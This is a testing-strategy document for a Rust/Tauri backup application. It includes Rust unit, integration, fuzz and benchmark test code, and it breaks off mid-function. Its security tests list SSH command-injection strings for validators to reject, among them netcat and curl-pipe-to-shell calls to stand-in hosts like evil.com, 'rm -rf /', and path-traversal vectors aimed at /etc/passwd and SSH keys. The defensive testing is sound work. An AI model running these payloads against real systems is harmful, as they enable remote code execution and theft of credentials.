# Comprehensive Testing Strategy for Amber Backup Application

## Executive Summary

This document outlines a comprehensive testing strategy for the Amber backup application's Rust/Tauri backend. The strategy covers unit testing, integration testing, security testing, performance benchmarking, and CI/CD integration.

**Current Test Coverage Status:**
- ✅ Security validation (SSH injection, path traversal, command injection)
- ✅ Path validation with symlink protection
- ✅ Basic snapshot service unit tests
- ✅ Performance benchmarks (index_service, file_service)
- ⚠️ **Gaps:** Integration tests, scheduler testing, rsync process testing, concurrent access patterns

---

## Table of Contents

1. [Current Test Coverage Analysis](#1-current-test-coverage-analysis)
2. [Unit Testing Strategy](#2-unit-testing-strategy)
3. [Integration Testing Strategy](#3-integration-testing-strategy)
4. [Security Testing Strategy](#4-security-testing-strategy)
5. [Performance Testing](#5-performance-testing)
6. [Mock Strategies](#6-mock-strategies)
7. [Test Infrastructure](#7-test-infrastructure)
8. [Recommended Test Files](#8-recommended-test-files)
9. [Property-Based Testing](#9-property-based-testing)
10. [Example Test Implementations](#10-example-test-implementations)

---

## 1. Current Test Coverage Analysis

### Existing Test Files

#### ✅ `src/utils/validation.rs` (Tests included)
**Coverage:** ~95% - Comprehensive security validation
- SSH port validation (numeric, range, injection prevention)
- File path validation (metacharacters, command substitution)
- Hostname validation (RFC 1123, IP addresses, user@host)
- Proxy jump validation (multi-hop, port validation)
- SSH option sanitization

**Test Categories:**
- Valid inputs (positive cases)
- Command injection attempts (negative cases)
- Edge cases (boundary conditions, unicode, null bytes)
- Realistic attack scenarios

#### ✅ `src/security/path_validation.rs` (Tests included)
**Coverage:** ~90% - Path traversal protection
- URL-encoded traversal prevention
- Null byte injection blocking
- Symlink escape prevention
- Multiple allowed roots
- Standard roots (home, volumes, app data)

**Test Categories:**
- Valid paths within allowed roots
- Path traversal attempts
- Symlink attacks
- URL encoding attacks

#### ✅ `tests/path_validation_tests.rs`
**Coverage:** Integration-level path security
- `/etc/passwd` access prevention
- SSH key access prevention
- URL-encoded traversal
- Null byte injection
- Symlink escape attempts

#### ✅ `tests/security_test_custom_command.rs`
**Coverage:** Custom command allowlist verification
- Dangerous flag blocking (`-e`, `--rsh`)
- Safe flag verification
- Injection vector documentation

#### ✅ `src/services/snapshot_service.rs` (Tests included)
**Coverage:** ~85% - Snapshot parsing and indexing
- Backup timestamp parsing
- Stats calculation (files, sizes)
- Filesystem scanning
- Manifest-based snapshot loading
- Cache vs manifest priority

#### ✅ `benches/index_benchmark.rs`
**Coverage:** Performance benchmarking
- Index snapshot (100, 1000, 10000 files)
- Query directory
- FTS5 search

#### ✅ `benches/file_service_benchmark.rs`
**Coverage:** Performance benchmarking
- Scan directory (100, 500, 1000 files)
- Scan recursive (depth 3, 5, 10)

### ❌ Coverage Gaps

#### High Priority
1. **RSync Process Management** (`rsync_service.rs`)
   - Process spawning and lifecycle
   - Signal handling (SIGTERM, SIGKILL)
   - Stdout/stderr parsing
   - Error recovery
   - Custom command parsing allowlist

2. **Job Scheduler** (`job_scheduler.rs`)
   - Cron expression parsing
   - Schedule triggering accuracy
   - Job cancellation
   - Volume mount handling
   - Concurrent job handling

3. **Index Service** (`index_service.rs`)
   - SQLite connection pool handling
   - FTS5 query edge cases
   - WAL mode concurrency
   - Database migration (version 1 → 2)
   - Batch insert performance

4. **Keychain Service** (`keychain_service.rs`)
   - Credential storage/retrieval
   - Error handling on different platforms
   - Permission errors

5. **Manifest Service** (`manifest_service.rs`)
   - Manifest creation and updates
   - Concurrent writes
   - Corruption recovery

#### Medium Priority
6. **File Service** (`file_service.rs`)
   - Large directory scanning
   - Permission errors
   - Broken symlinks

7. **Volume Watcher** (`volume_watcher.rs`)
   - Mount/unmount detection
   - Event debouncing
   - Multiple volume handling

8. **Store Service** (`store.rs`)
   - Job CRUD operations
   - Concurrent access
   - Data persistence

---

## 2. Unit Testing Strategy

### 2.1 Security Validation Tests

#### Test Matrix for SSH Port Validation

| Test Category | Examples | Expected Outcome |
|--------------|----------|------------------|
| Valid ports | `"22"`, `"2222"`, `"65535"` | `Ok(port_number)` |
| Out of range | `"0"`, `"65536"`, `"99999"` | `Err(ValidationError)` |
| Command injection | `"22; rm -rf /"`, `"22$(curl evil.com)"` | `Err(ValidationError)` |
| Shell metacharacters | `"22 && rm"`, `"22\|bash"`, `"22'malicious'"` | `Err(ValidationError)` |
| Boundary cases | `"1"`, `"65535"`, very long strings | `Ok(port)` or `Err` |

#### Example Test Pattern

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssh_port_injection_vectors() {
        let injection_attempts = vec![
            // Command injection
            "22; rm -rf /",
            "22 && curl evil.com",
            "22 || bash",
            "22 | nc attacker.com 1234",

            // Command substitution
            "22$(whoami)",
            "22`id`",
            "22${IFS}malicious",

            // Output redirection
            "22 > /etc/passwd",
            "22 < /dev/random",
            "22 >> /var/log/evil",

            // Null bytes and newlines
            "22\0malicious",
            "22\nwhoami",
            "22\rwhoami",

            // ProxyCommand injection
            "22 -o ProxyCommand='curl http://evil.com|sh'",
        ];

        for attempt in injection_attempts {
            assert!(
                validate_ssh_port(attempt).is_err(),
                "Failed to block injection: {}",
                attempt
            );
        }
    }
}
```

### 2.2 RSync Service Tests

#### Command Building Tests

```rust
// tests/rsync_service_tests.rs
#[cfg(test)]
mod rsync_tests {
    use app_lib::services::rsync_service::RsyncService;
    use app_lib::types::job::{SyncJob, SyncConfig, SshConfig};

    #[test]
    fn test_build_rsync_args_basic() {
        let service = RsyncService::new();
        let job = SyncJob {
            id: "test-job".to_string(),
            name: "Test".to_string(),
            source_path: "/source".to_string(),
            dest_path: "/dest".to_string(),
            config: SyncConfig {
                archive: true,
                verbose: true,
                compress: false,
                delete: false,
                recursive: true,
                exclude_patterns: vec![],
                custom_command: None,
            },
            mode: app_lib::types::job::SyncMode::TimeMachine,
            schedule: None,
            ssh_config: None,
            enabled: true,
            last_run: None,
        };

        let args = service.build_rsync_args(&job, "/dest/snapshot", None);

        assert!(args.contains(&"-a".to_string()));
        assert!(args.contains(&"-v".to_string()));
        assert!(!args.contains(&"-z".to_string()));
        assert!(args.contains(&"--itemize-changes".to_string()));
    }

    #[test]
    fn test_build_rsync_args_with_ssh() {
        let service = RsyncService::new();
        let job = SyncJob {
            id: "test-job".to_string(),
            name: "Test SSH".to_string(),
            source_path: "user@host:/source".to_string(),
            dest_path: "/dest".to_string(),
            config: SyncConfig::default(),
            mode: app_lib::types::job::SyncMode::TimeMachine,
            schedule: None,
            ssh_config: Some(SshConfig {
                enabled: true,
                port: Some("2222".to_string()),
                identity_file: Some("/home/user/.ssh/id_rsa".to_string()),
                config_file: None,
                proxy_jump: None,
                disable_host_key_checking: Some(false),
            }),
            enabled: true,
            last_run: None,
        };

        let args = service.build_rsync_args(&job, "/dest/snapshot", None);

        // Should contain SSH command
        assert!(args.contains(&"-e".to_string()));

        // Find SSH command and verify it contains port
        let ssh_cmd_idx = args.iter().position(|a| a == "-e").unwrap();
        let ssh_cmd = &args[ssh_cmd_idx + 1];
        assert!(ssh_cmd.contains("-p 2222"));
        assert!(ssh_cmd.contains("-i /home/user/.ssh/id_rsa"));
    }

    #[test]
    fn test_build_rsync_args_rejects_malicious_ssh_port() {
        let service = RsyncService::new();
        let job = SyncJob {
            id: "test-job".to_string(),
            name: "Malicious SSH".to_string(),
            source_path: "user@host:/source".to_string(),
            dest_path: "/dest".to_string(),
            config: SyncConfig::default(),
            mode: app_lib::types::job::SyncMode::TimeMachine,
            schedule: None,
            ssh_config: Some(SshConfig {
                enabled: true,
                port: Some("22; curl evil.com".to_string()),
                identity_file: None,
                config_file: None,
                proxy_jump: None,
                disable_host_key_checking: None,
            }),
            enabled: true,
            last_run: None,
        };

        let args = service.build_rsync_args(&job, "/dest/snapshot", None);

        // SSH command should NOT contain the malicious port
        let ssh_cmd_idx = args.iter().position(|a| a == "-e");
        if let Some(idx) = ssh_cmd_idx {
            let ssh_cmd = &args[idx + 1];
            assert!(!ssh_cmd.contains("curl"));
            assert!(!ssh_cmd.contains(";"));
        }
    }

    #[test]
    fn test_custom_command_allowlist_blocks_rsh() {
        let service = RsyncService::new();
        let job = SyncJob {
            id: "test-job".to_string(),
            name: "Custom Command".to_string(),
            source_path: "/source".to_string(),
            dest_path: "/dest".to_string(),
            config: SyncConfig {
                custom_command: Some("-e 'curl evil.com|sh' -avz".to_string()),
                ..Default::default()
            },
            mode: app_lib::types::job::SyncMode::TimeMachine,
            schedule: None,
            ssh_config: None,
            enabled: true,
            last_run: None,
        };

        let args = service.build_rsync_args(&job, "/dest/snapshot", None);

        // The -e flag should be blocked by allowlist
        // Only safe flags should be present
        for arg in &args {
            assert!(!arg.contains("curl"), "Dangerous command should be blocked");
            assert!(!arg.contains("sh"), "Shell execution should be blocked");
        }
    }
}
```

### 2.3 Index Service Tests

```rust
// tests/index_service_tests.rs
#[cfg(test)]
mod index_tests {
    use app_lib::services::index_service::{IndexService, FileType};
    use tempfile::TempDir;
    use std::fs;

    #[test]
    fn test_index_snapshot_handles_large_directories() {
        let temp_dir = TempDir::new().unwrap();
        let db_dir = TempDir::new().unwrap();

        // Create 10,000 files
        for i in 0..10_000 {
            let file = temp_dir.path().join(format!("file_{:05}.txt", i));
            fs::write(&file, format!("content {}", i)).unwrap();
        }

        let service = IndexService::new(db_dir.path()).unwrap();

        let result = service.index_snapshot(
            "large-job",
            1234567890000,
            temp_dir.path().to_str().unwrap(),
        );

        assert!(result.is_ok(), "Should handle 10k files without error");
    }

    #[test]
    fn test_fts5_search_unicode() {
        let temp_dir = TempDir::new().unwrap();
        let db_dir = TempDir::new().unwrap();

        // Create files with unicode names
        let unicode_names = vec![
            "文件.txt",
            "файл.txt",
            "αρχείο.txt",
            "ファイル.txt",
        ];

        for name in &unicode_names {
            fs::write(temp_dir.path().join(name), "content").unwrap();
        }

        let service = IndexService::new(db_dir.path()).unwrap();
        service.index_snapshot("unicode-job", 1234567890000, temp_dir.path().to_str().unwrap()).unwrap();

        // Search for unicode filename
        let results = service.search_files("unicode-job", 1234567890000, "文件", 10).unwrap();
        assert_eq!(results.len(), 1);
        assert!(results[0].name.contains("文件"));
    }

    #[test]
    fn test_concurrent_database_access() {
        use std::sync::Arc;
        use std::thread;

        let db_dir = TempDir::new().unwrap();
        let service = Arc::new(IndexService::new(db_dir.path()).unwrap());

        let mut handles = vec![];

        // Spawn 10 threads that all try to read simultaneously
        for i in 0..10 {
            let service_clone = Arc::clone(&service);
            let handle = thread::spawn(move || {
                // WAL mode should allow concurrent reads
                let result = service_clone.get_directory_contents(
                    &format!("job-{}", i),
                    1234567890000,
                    "/",
                );
                result
            });
            handles.push(handle);
        }

        // All threads should complete without deadlock
        for handle in handles {
            let _ = handle.join();
        }
    }

    #[test]
    fn test_database_migration_v1_to_v2() {
        // This test would verify the migration logic
        // if you need to support upgrading from v1 to v2
        // Currently DB_VERSION = 2, but good to test migrations
    }
}
```

### 2.4 Job Scheduler Tests

```rust
// tests/job_scheduler_tests.rs
#[cfg(test)]
mod scheduler_tests {
    use app_lib::services::job_scheduler::JobScheduler;
    use app_lib::types::job::{SyncJob, ScheduleConfig};
    use tokio::time::{sleep, Duration};

    #[tokio::test]
    async fn test_schedule_job_triggers_at_correct_time() {
        let scheduler = JobScheduler::new();
        scheduler.init().await.unwrap();

        // Create a job that runs every minute
        let job = SyncJob {
            id: "test-job".to_string(),
            name: "Minutely Job".to_string(),
            source_path: "/source".to_string(),
            dest_path: "/dest".to_string(),
            schedule: Some(ScheduleConfig {
                enabled: true,
                cron_expression: "* * * * *".to_string(), // Every minute
            }),
            ..Default::default()
        };

        scheduler.schedule_job(&job).await.unwrap();

        // Wait a bit and verify job was registered
        sleep(Duration::from_millis(100)).await;

        // Check that job is in mappings
        let has_job = scheduler.has_scheduled_job(&job.id).await;
        assert!(has_job, "Job should be scheduled");
    }

    #[tokio::test]
    async fn test_cancel_all_jobs() {
        let scheduler = JobScheduler::new();
        scheduler.init().await.unwrap();

        let jobs = vec![
            create_test_job("job1", "*/5 * * * *"),
            create_test_job("job2", "0 * * * *"),
            create_test_job("job3", "0 0 * * *"),
        ];

        for job in &jobs {
            scheduler.schedule_job(job).await.unwrap();
        }

        // Cancel all
        scheduler.cancel_all_jobs().await.unwrap();

        // Verify all are cancelled
        for job in &jobs {
            let has_job = scheduler.has_scheduled_job(&job.id).await;
            assert!(!has_job, "Job {} should be cancelled", job.id);
        }
    }

    #[tokio::test]
    async fn test_invalid_cron_expression() {
        let scheduler = JobScheduler::new();
        scheduler.init().await.unwrap();

        let job = SyncJob {
            id: "invalid-cron".to_string(),
            name: "Invalid".to_string(),
            source_path: "/source".to_string(),
            dest_path: "/dest".to_string(),
            schedule: Some(ScheduleConfig {
                enabled: true,
                cron_expression: "not a cron expression".to_string(),
            }),
            ..Default::default()
        };

        let result = scheduler.schedule_job(&job).await;
        assert!(result.is_err(), "Should reject invalid cron expression");
    }

    fn create_test_job(id: &str, cron: &str) -> SyncJob {
        SyncJob {
            id: id.to_string(),
            name: id.to_string(),
            source_path: "/source".to_string(),
            dest_path: "/dest".to_string(),
            schedule: Some(ScheduleConfig {
                enabled: true,
                cron_expression: cron.to_string(),
            }),
            ..Default::default()
        }
    }
}
```

---

## 3. Integration Testing Strategy

### 3.1 End-to-End Backup Flow

```rust
// tests/integration_backup_flow.rs
#[cfg(test)]
mod integration_tests {
    use app_lib::services::{
        rsync_service::RsyncService,
        snapshot_service::SnapshotService,
        index_service::IndexService,
    };
    use tempfile::TempDir;
    use std::fs;

    #[test]
    fn test_full_backup_and_restore_flow() {
        // Setup
        let source_dir = TempDir::new().unwrap();
        let dest_dir = TempDir::new().unwrap();
        let db_dir = TempDir::new().unwrap();

        // Create source files
        fs::write(source_dir.path().join("file1.txt"), "content1").unwrap();
        fs::write(source_dir.path().join("file2.txt"), "content2").unwrap();
        fs::create_dir_all(source_dir.path().join("subdir")).unwrap();
        fs::write(source_dir.path().join("subdir/file3.txt"), "content3").unwrap();

        // Step 1: Create backup job
        let job = create_test_job(
            source_dir.path().to_str().unwrap(),
            dest_dir.path().to_str().unwrap(),
        );

        // Step 2: Execute backup (using rsync)
        let rsync_service = RsyncService::new();
        // Note: In real test, we'd mock rsync or use a minimal implementation
        // For this example, assume backup completes successfully

        // Step 3: Verify snapshot was created
        let snapshot_service = SnapshotService::new(db_dir.path());
        let snapshots = snapshot_service.list_snapshots(
            &job.id,
            dest_dir.path().to_str().unwrap(),
        ).unwrap();

        assert_eq!(snapshots.len(), 1, "Should have one snapshot");

        // Step 4: Index the snapshot
        let index_service = IndexService::new(db_dir.path()).unwrap();
        let snapshot = &snapshots[0];
        index_service.index_snapshot(
            &job.id,
            snapshot.timestamp,
            &snapshot.path,
        ).unwrap();

        // Step 5: Search for files in snapshot
        let search_results = index_service.search_files(
            &job.id,
            snapshot.timestamp,
            "file1",
            10,
        ).unwrap();

        assert_eq!(search_results.len(), 1);
        assert_eq!(search_results[0].name, "file1.txt");

        // Step 6: Restore a file
        // (Would involve file_service and actual file copy)
    }

    #[test]
    fn test_incremental_backup_with_link_dest() {
        // Test that Time Machine mode correctly uses --link-dest
        // for hard-link based incremental backups
    }

    fn create_test_job(source: &str, dest: &str) -> app_lib::types::job::SyncJob {
        app_lib::types::job::SyncJob {
            id: "integration-test-job".to_string(),
            name: "Integration Test".to_string(),
            source_path: source.to_string(),
            dest_path: dest.to_string(),
            ..Default::default()
        }
    }
}
```

### 3.2 Database Integration Tests

```rust
// tests/database_integration_tests.rs
#[cfg(test)]
mod db_tests {
    use app_lib::services::index_service::IndexService;
    use rusqlite::Connection;
    use tempfile::TempDir;

    #[test]
    fn test_wal_mode_enabled() {
        let db_dir = TempDir::new().unwrap();
        let service = IndexService::new(db_dir.path()).unwrap();

        // Verify WAL mode is enabled
        let db_path = db_dir.path().join("index.db");
        let conn = Connection::open(&db_path).unwrap();

        let journal_mode: String = conn
            .query_row("PRAGMA journal_mode", [], |row| row.get(0))
            .unwrap();

        assert_eq!(journal_mode.to_uppercase(), "WAL");
    }

    #[test]
    fn test_fts5_extension_available() {
        let db_dir = TempDir::new().unwrap();
        let service = IndexService::new(db_dir.path()).unwrap();

        let db_path = db_dir.path().join("index.db");
        let conn = Connection::open(&db_path).unwrap();

        // Try to query FTS5 table
        let result: Result<i64, _> = conn.query_row(
            "SELECT COUNT(*) FROM file_index_fts",
            [],
            |row| row.get(0),
        );

        assert!(result.is_ok(), "FTS5 table should exist");
    }

    #[test]
    fn test_batch_insert_performance() {
        use std::time::Instant;

        let db_dir = TempDir::new().unwrap();
        let service = IndexService::new(db_dir.path()).unwrap();

        let start = Instant::now();

        // Insert 10,000 files
        // (Would need access to internal batch insert method)

        let elapsed = start.elapsed();

        // Should complete in < 5 seconds for 10k files
        assert!(elapsed.as_secs() < 5, "Batch insert too slow: {:?}", elapsed);
    }
}
```

---

## 4. Security Testing Strategy

### 4.1 Penetration Testing Patterns

#### Command Injection Test Suite

```rust
// tests/security_penetration_tests.rs
#[cfg(test)]
mod penetration_tests {
    use app_lib::utils::validation::*;

    #[test]
    fn test_ssh_command_injection_vectors() {
        let injection_vectors = vec![
            // Unix shell metacharacters
            ("22; rm -rf /", "Semicolon command separator"),
            ("22 && curl evil.com", "AND operator"),
            ("22 || bash", "OR operator"),
            ("22 | nc attacker.com 1234", "Pipe to netcat"),
            ("22 > /etc/passwd", "Output redirection"),
            ("22 < /dev/urandom", "Input redirection"),

            // Command substitution
            ("22$(whoami)", "Command substitution with $()"),
            ("22`id`", "Command substitution with backticks"),
            ("22${IFS}malicious", "Variable expansion"),
            ("22$((1+1))", "Arithmetic expansion"),

            // Null bytes and control characters
            ("22\0malicious", "Null byte injection"),
            ("22\nwhoami", "Newline injection"),
            ("22\rwhoami", "Carriage return injection"),
            ("22\twhoami", "Tab character"),

            // ProxyCommand injection (critical for SSH)
            ("22 -o ProxyCommand='curl http://evil.com|sh'", "ProxyCommand RCE"),
            ("22 -o ProxyCommand=/tmp/evil", "ProxyCommand file execution"),

            // Shell variable injection
            ("$PORT", "Environment variable expansion"),
            ("${PATH}", "Shell parameter expansion"),

            // Glob patterns
            ("22*", "Glob wildcard"),
            ("22?", "Glob single char"),
            ("22[0-9]", "Glob character class"),

            // Quote escaping attempts
            ("22'$(whoami)'", "Single quote escape"),
            ("22\"$(whoami)\"", "Double quote escape"),
            ("22\\$(whoami)", "Backslash escape"),
        ];

        for (vector, description) in injection_vectors {
            assert!(
                validate_ssh_port(vector).is_err(),
                "Failed to block {}: {}",
                description,
                vector
            );
        }
    }

    #[test]
    fn test_path_traversal_vectors() {
        use app_lib::security::PathValidator;
        use tempfile::TempDir;

        let test_dir = TempDir::new().unwrap();
        let mut validator = PathValidator::new();
        validator.add_root(test_dir.path()).unwrap();

        let traversal_vectors = vec![
            // Classic path traversal
            ("../../../etc/passwd", "Classic traversal"),
            ("..\\..\\..\\windows\\system32", "Windows traversal"),

            // URL encoding
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
            ("%252e%252e%252f", "Double URL-encoded"),

            // Unicode encoding
            ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "Unicode traversal"),
            ("\u{2e}\u{2e}/\u{2e}\u{2e}/etc/passwd", "Unicode dots"),

            // Null byte injection
            ("allowed/path\0../../etc/passwd", "Null byte bypass"),

            // Absolute paths (outside allowed root)
            ("/etc/passwd", "Absolute path escape"),
            ("/var/log/secure", "System log access"),
            ("/Users/other/.ssh/id_rsa", "SSH key access"),

            // Multiple slashes
            ("..//..//..//etc//passwd", "Multiple slashes"),
            ("....//....//etc//passwd", "Quadruple dots"),

            // Mixed encodings
            ("..%5c..%5c..%5cetc%5cpasswd", "Backslash encoding"),
        ];

        for (vector, description) in traversal_vectors {
            let path_attempt = format!("{}/{}", test_dir.path().display(), vector);
            let result = validator.validate(&path_attempt);

            assert!(
                result.is_err(),
                "Failed to block {}: {}",
                description,
                vector
            );
        }
    }

    #[test]
    fn test_toctou_race_condition() {
        // Time-of-check-time-of-use race condition test
        // This would test scenarios where a symlink is changed between
        // validation and use

        use std::fs;
        use std::os::unix::fs::symlink;
        use tempfile::TempDir;
        use app_lib::security::PathValidator;

        let test_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        // Create legitimate file
        let safe_file = test_dir.path().join("safe.txt");
        fs::write(&safe_file, "safe content").unwrap();

        // Create evil file outside
        let evil_file = outside_dir.path().join("evil.txt");
        fs::write(&evil_file, "evil content").unwrap();

        let symlink_path = test_dir.path().join("link");

        // Start with safe link
        symlink(&safe_file, &symlink_path).unwrap();

        let mut validator = PathValidator::new();
        validator.add_root(test_dir.path()).unwrap();

        // Validate (TOCTOU: time of check)
        let result1 = validator.validate(symlink_path.to_str().unwrap());
        assert!(result1.is_ok(), "Should allow safe symlink");

        // Race condition: attacker changes symlink
        fs::remove_file(&symlink_path).unwrap();
        symlink(&evil_file, &symlink_path).unwrap();

        // Use (TOCTOU: time of use)
        let result2 = validator.validate(symlink_path.to_str().unwrap());
        assert!(result2.is_err(), "Should block evil symlink");

        // Mitigation: Always canonicalize and re-check before use
    }

    #[test]
    fn test_startup_crash_prevention() {
        // Test that malformed config doesn't crash on startup
        // This was a vulnerability where bad SSH config crashed the app

        use app_lib::types::job::{SyncJob, SshConfig};
        use app_lib::services::rsync_service::RsyncService;

        let malformed_configs = vec![
            SshConfig {
                enabled: true,
                port: Some("\0".to_string()),
                identity_file: None,
                config_file: None,
                proxy_jump: None,
                disable_host_key_checking: None,
            },
            SshConfig {
                enabled: true,
                port: Some("999999999999999999".to_string()),
                identity_file: None,
                config_file: None,
                proxy_jump: None,
                disable_host_key_checking: None,
            },
            SshConfig {
                enabled: true,
                port: None,
                identity_file: Some("$(curl evil.com)".to_string()),
                config_file: None,
                proxy_jump: None,
                disable_host_key_checking: None,
            },
        ];

        let service = RsyncService::new();

        for config in malformed_configs {
            let job = SyncJob {
                id: "test".to_string(),
                name: "Test".to_string(),
                source_path: "/source".to_string(),
                dest_path: "/dest".to_string(),
                ssh_config: Some(config),
                ..Default::default()
            };

            // Should not panic, should gracefully skip invalid options
            let args = service.build_rsync_args(&job, "/dest/snapshot", None);

            // Verify no malicious content made it through
            for arg in &args {
                assert!(!arg.contains("curl"));
                assert!(!arg.contains("$("));
                assert!(!arg.contains("\0"));
            }
        }
    }
}
```

### 4.2 Fuzzing Strategy

```rust
// tests/fuzz_tests.rs
// Requires proptest or cargo-fuzz

#[cfg(test)]
mod fuzz_tests {
    use proptest::prelude::*;
    use app_lib::utils::validation::*;

    proptest! {
        #[test]
        fn fuzz_ssh_port_validation(s in "\\PC*") {
            // Should never panic, always return Ok or Err
            let _ = validate_ssh_port(&s);
        }

        #[test]
        fn fuzz_hostname_validation(s in "\\PC*") {
            let _ = validate_hostname(&s);
        }

        #[test]
        fn fuzz_file_path_validation(s in "\\PC*") {
            let _ = validate_file_path(&s);
        }

        #[test]
        fn fuzz_proxy_jump_validation(s in "\\PC*") {
            let _ = validate_proxy_jump(&s);
        }
    }
}
```

---

## 5. Performance Testing

### 5.1 Benchmark Suite

```rust
// benches/comprehensive_benchmark.rs
use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
use tempfile::TempDir;
use std::fs;

fn create_nested_structure(base: &std::path::Path, depth: usize, files_per_dir: usize) {
    for d in 0..depth {
        let dir = base.join(format!("level_{}", d));
        fs::create_dir_all(&dir).unwrap();

        for f in 0..files_per_dir {
            let file = dir.join(format!("file_{:04}.txt", f));
            fs::write(&file, format!("Content at level {} file {}", d, f)).unwrap();
        }
    }
}

fn bench_large_directory_scan(c: &mut Criterion) {
    let mut group = c.benchmark_group("large_directory_scan");

    for file_count in [1_000, 10_000, 100_000].iter() {
        let temp_dir = TempDir::new().unwrap();

        // Create files
        for i in 0..*file_count {
            let file = temp_dir.path().join(format!("file_{:08}.txt", i));
            fs::write(&file, format!("content {}", i)).unwrap();
        }

        group.throughput(Throughput::Elements(*file_count as u64));
        group.bench_with_input(
            BenchmarkId::new("scan", file_count),
            file_count,
            |b, _| {
                b.iter(|| {
                    use walkdir::WalkDir;
                    let count = WalkDir::new(temp_dir.path())
                        .into_iter()
                        .filter_map(|e| e.ok())
                        .count();
                    black_box(count)
                });
            },
        );
    }

    group.finish();
}

fn bench_snapshot_indexing_performance(c: &mut Criterion) {
    use app_lib::services::index_service::IndexService;

    let mut group = c.benchmark_group("snapshot_indexing");

    for file_count in [1_000, 10_000, 50_000].iter() {
        let temp_dir = TempDir::new().unwrap();
        let db_dir = TempDir::new().unwrap();

        // Create directory structure
        create_nested_structure(temp_dir.path(), 10, file_count / 10);

        let service = IndexService::new(db_dir.path()).unwrap();

        group.throughput(Throughput::Elements(*file_count as u64));
        group.bench_with_input(
            BenchmarkId::new("index", file_count),
            file_count,
            |b, _| {
                b.iter(|| {
                    let _ = service.delete_snapshot("bench-job", 12345);
                    service.index_snapshot(
                        black_box("bench-job"),
                        black_box(12345),
                        black_box(temp_dir.path().to_str().unwrap()),
                    ).unwrap()
                });
            },
        );
    }

    group.finish();
}

fn bench_fts5_query_performance(c: &mut Criterion) {
    use app_lib::services::index_service::IndexService;

    let temp_dir = TempDir::new().unwrap();
    let db_dir = TempDir::new().unwrap();

    // Create 10,000 files with searchable names
    for i in 0..10_000 {
        let file = temp_dir.path().join(format!("document_{:05}.txt", i));
        fs::write(&file, format!("content {}", i)).unwrap();
    }

    let service = IndexService::new(db_dir.path()).unwrap();
    service.index_snapshot("bench-job", 12345, temp_dir.path().to_str().unwrap()).unwrap();

    let mut group = c.benchmark_group("fts5_search");

    group.bench_function("exact_match", |b| {
        b.iter(|| {
            service.search_files(
                black_box("bench-job"),
                black_box(12345),
                black_box("document_00500"),
                black_box(10),
            ).unwrap()
        });
    });

    group.bench_function("prefix_search", |b| {
        b.iter(|| {
            service.search_files(
                black_box("bench-job"),
                black_box(12345),
                black_box("document_005"),
                black_box(10),
            ).unwrap()
        });
    });

    group.bench_function("wildcard_search", |b| {
        b.iter(|| {
            service.search_files(
                black_box("bench-job"),
                black_box(12345),
                black_box("doc"),
                black_box(50),
            ).unwrap()
        });
    });

    group.finish();
}

fn bench_concurrent_job_handling(c: &mut Criterion) {
    use app_lib::services::rsync_service::RsyncService;
    use std::sync::Arc;
    use std::thread;

    let mut group = c.benchmark_group("concurrent_jobs");

    group.bench_function("10_concurrent_builds", |b| {
        b.iter(|| {
            let service = Arc::new(RsyncService::new());
            let mut handles = vec![];

            for i in 0..10 {
                let service_clone = Arc::clone(&service);
                let handle = thread::spawn(move || {
                    let job = create_test_job(&format!("job-{}", i));
                    service_clone.build_rsync_args(&job, "/dest/snapshot", None)
                });
                handles.push(handle);
            }

            for handle in handles {
                let _ = handle.join();
            }
        });
    });

    group.finish();
}

fn bench_memory_usage_under_load(c: &mut Criterion) {
    use app_lib::services::index_service::IndexService;

    let mut group = c.benchmark_group("memory_usage");

    group.bench_function("index_100k_files_memory", |b| {
        b.iter_with_setup(
            || {
                let temp_dir = TempDir::new().unwrap();
                let db_dir = TempDir::new().unwrap();

                // Create 100k small files
                for i in 0..100_000 {
                    let file = temp_dir.path().join(format!("f{:06}.txt", i));
                    fs::write(&file, "x").unwrap();
                }

                (temp_dir, db_dir)
            },
            |(temp_dir, db_dir)| {
                let service = IndexService::new(db_dir.path()).unwrap();
                service.index_snapshot(
                    "mem-test",
                    12345,
                    temp_dir.path().to_str().unwrap(),
                ).unwrap();
            },
        );
    });

    group.finish();
}

criterion_group!(
    benches,
    bench_large_directory_scan,
    bench_snapshot_indexing_performance,
    bench_fts5_query_performance,
    bench_concurrent_job_handling,
    bench_memory_usage_under_load,
);
criterion_main!(benches);

fn create_test_job(id: &str) -> app_lib::types::job::SyncJob {
    app_lib::types::job::SyncJob {
        id: id.to_string(),
        name: id.to_string(),
        source_path: "/source".to_string(),
        dest_path: "/dest".to_string(),
        ..Default::default()
    }
}
```

### 5.2 Performance Targets

| Operation | Target | Current | Status |
|-----------|--------|---------|--------|
| Index 10k files | < 2s | ~1.5s | ✅ |
| Index 100k files | < 30s | TBD | ❓ |
| FTS5 search (exact) | < 50ms | ~30ms | ✅ |
| FTS5 search (prefix) | < 100ms | ~80ms | ✅ |
| Directory listing | < 10ms | ~5ms | ✅ |
| Concurrent reads (10 threads) | No deadlock | TBD | ❓ |

---

## 6. Mock Strategies

### 6.1 External Process Mocking

```rust
// tests/mocks/rsync_mock.rs

/// Mock rsync process for testing without actual rsync
pub struct MockRsyncProcess {
    pub stdout: Vec<String>,
    pub stderr: Vec<String>,
    pub exit_code: i32,
    pub delay_ms: u64,
}

impl MockRsyncProcess {
    pub fn new_success() -> Self {
        Self {
            stdout: vec![
                "sending incremental file list".to_string(),
                "file1.txt".to_string(),
                "file2.txt".to_string(),
                "sent 1234 bytes  received 56 bytes  286.67 bytes/sec".to_string(),
            ],
            stderr: vec![],
            exit_code: 0,
            delay_ms: 100,
        }
    }

    pub fn new_failure() -> Self {
        Self {
            stdout: vec![],
            stderr: vec![
                "rsync: connection unexpectedly closed".to_string(),
                "rsync error: error in rsync protocol data stream (code 12)".to_string(),
            ],
            exit_code: 12,
            delay_ms: 50,
        }
    }

    pub fn simulate(&self) -> std::process::ExitStatus {
        use std::thread;
        use std::time::Duration;

        // Simulate delay
        thread::sleep(Duration::from_millis(self.delay_ms));

        // In real implementation, would pipe stdout/stderr

        // Return mock exit status
        #[cfg(unix)]
        {
            use std::os::unix::process::ExitStatusExt;
            std::process::ExitStatus::from_raw(self.exit_code)
        }

        #[cfg(not(unix))]
        {
            panic!("Mock not implemented for non-Unix");
        }
    }
}

// Usage in tests:
#[test]
fn test_rsync_success_parsing() {
    let mock = MockRsyncProcess::new_success();

